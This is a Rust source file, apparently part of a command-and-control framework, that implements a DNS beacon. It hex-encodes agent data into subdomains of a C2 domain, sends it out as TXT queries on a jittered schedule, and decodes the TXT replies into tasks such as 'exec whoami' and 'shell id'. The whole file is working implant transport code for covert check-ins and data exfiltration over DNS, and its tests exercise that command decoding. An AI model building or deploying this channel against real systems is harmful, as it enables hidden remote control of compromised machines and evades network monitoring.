use std::time::Duration;
use hickory_resolver::proto::rr::RData;
use rand::RngExt;

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct DnsBeaconConfig {
    pub domain: String,
    pub resolver: String,
    pub interval_secs: u64,
    pub jitter_pct: f64,
    pub max_subdomain_len: usize,
}

impl Default for DnsBeaconConfig {
    fn default() -> Self {
        DnsBeaconConfig {
            domain: "c2.kraken.local".to_string(),
            resolver: "8.8.8.8".to_string(),
            interval_secs: 120,
            jitter_pct: 0.3,
            max_subdomain_len: 32,
        }
    }
}

#[derive(Debug, Clone, serde::Serialize, serde::Deserialize)]
pub struct DnsCommand {
    pub id: String,
    pub action: String,
    pub args: String,
}

pub struct DnsBeacon {
    config: DnsBeaconConfig,
    agent_id: String,
    resolver: Option<hickory_resolver::TokioResolver>,
}

impl DnsBeacon {
    pub fn new(config: DnsBeaconConfig) -> Self {
        let resolver = hickory_resolver::TokioResolver::builder_tokio()
            .ok()
            .and_then(|b| b.build().ok());
        DnsBeacon {
            agent_id: uuid::Uuid::new_v4().to_string(),
            config,
            resolver,
        }
    }

    pub fn with_agent_id(mut self, agent_id: &str) -> Self {
        self.agent_id = agent_id.to_string();
        self
    }

    fn jitter_delay(&self) -> Duration {
        let base = self.config.interval_secs as f64;
        let jitter = base * self.config.jitter_pct * rand::rng().random::<f64>();
        let total = base + jitter - (self.config.jitter_pct * base / 2.0);
        Duration::from_secs_f64(total.max(1.0))
    }

    pub async fn send_data(&self, data: &str) -> Result<DnsCommand, crate::C2Error> {
        let encoded = self.encode_data(data);
        let query = format!("{}.{}", encoded, self.config.domain);

        match &self.resolver {
            Some(resolver) => {
                match resolver.txt_lookup(query).await {
                    Ok(response) => {
                        for record in response.answers() {
                            if let RData::TXT(txt) = &record.data {
                                for txt_data in txt.txt_data.iter() {
                                    if let Ok(text) = String::from_utf8(txt_data.to_vec()) {
                                        if let Ok(decoded) = self.decode_response(&text) {
                                            return Ok(decoded);
                                        }
                                    }
                                }
                            }
                        }
                        Err(crate::C2Error::Transport("No valid TXT records found".to_string()))
                    }
                    Err(e) => Err(crate::C2Error::Transport(format!("DNS lookup failed: {}", e))),
                }
            }
            None => Err(crate::C2Error::Transport("DNS resolver not initialized".to_string())),
        }
    }

    fn encode_data(&self, data: &str) -> String {
        let encoded = hex::encode(data);
        encoded.chars()
            .collect::<Vec<char>>()
            .chunks(self.config.max_subdomain_len)
            .map(|c| c.iter().collect::<String>())
            .collect::<Vec<String>>()
            .join(".")
    }

    fn decode_response(&self, txt: &str) -> Result<DnsCommand, crate::C2Error> {
        let trimmed = txt.trim_matches('"');
        let bytes = hex::decode(trimmed)
            .map_err(|e| crate::C2Error::Protocol(format!("hex decode failed: {}", e)))?;
        serde_json::from_slice::<DnsCommand>(&bytes)
            .map_err(|e| crate::C2Error::Protocol(format!("json decode failed: {}", e)))
    }

    pub async fn beacon_loop(&self, mut cancel: tokio::sync::watch::Receiver<bool>) {
        let mut interval = tokio::time::interval(self.jitter_delay());
        loop {
            tokio::select! {
                _ = interval.tick() => {
                    let data = format!("{{\"id\":\"{}\",\"status\":\"alive\"}}", self.agent_id);
                    match self.send_data(&data).await {
                        Ok(cmd) => log::info!("DNS C2 command: {:?}", cmd),
                        Err(e) => log::warn!("DNS beacon failed: {}", e),
                    }
                    interval = tokio::time::interval(self.jitter_delay());
                }
                _ = cancel.changed() => {
                    if *cancel.borrow() {
                        break;
                    }
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dns_config_default() {
        let config = DnsBeaconConfig::default();
        assert_eq!(config.domain, "c2.kraken.local");
        assert_eq!(config.max_subdomain_len, 32);
    }

    #[test]
    fn test_encode_data() {
        let config = DnsBeaconConfig::default();
        let beacon = DnsBeacon::new(config);
        let encoded = beacon.encode_data("hello");
        assert_eq!(encoded, "68656c6c6f");
    }

    #[test]
    fn test_encode_data_long() {
        let config = DnsBeaconConfig::default();
        let beacon = DnsBeacon::new(config);
        let long = "a".repeat(100);
        let encoded = beacon.encode_data(&long);
        assert!(encoded.contains('.'));
    }

    #[test]
    fn test_decode_response() {
        let config = DnsBeaconConfig::default();
        let beacon = DnsBeacon::new(config);
        let cmd = DnsCommand {
            id: "1".to_string(),
            action: "exec".to_string(),
            args: "whoami".to_string(),
        };
        let json = serde_json::to_string(&cmd).unwrap();
        let encoded = hex::encode(&json);
        let decoded = beacon.decode_response(&encoded).unwrap();
        assert_eq!(decoded.action, "exec");
        assert_eq!(decoded.args, "whoami");
    }

    #[test]
    fn test_dns_command_serialization() {
        let cmd = DnsCommand {
            id: "task-001".to_string(),
            action: "shell".to_string(),
            args: "id".to_string(),
        };
        let json = serde_json::to_string_pretty(&cmd).unwrap();
        assert!(json.contains("shell"));
    }

    #[test]
    fn test_dns_beacon_agent_id() {
        let config = DnsBeaconConfig::default();
        let beacon = DnsBeacon::new(config).with_agent_id("dns-agent-1");
        assert_eq!(beacon.agent_id, "dns-agent-1");
    }

    #[test]
    fn test_jitter_delay_range() {
        let config = DnsBeaconConfig::default();
        let beacon = DnsBeacon::new(config);
        for _ in 0..100 {
            let d = beacon.jitter_delay();
            let secs = d.as_secs_f64();
            assert!(secs >= 1.0);
            assert!(secs <= 156.0);
        }
    }
}
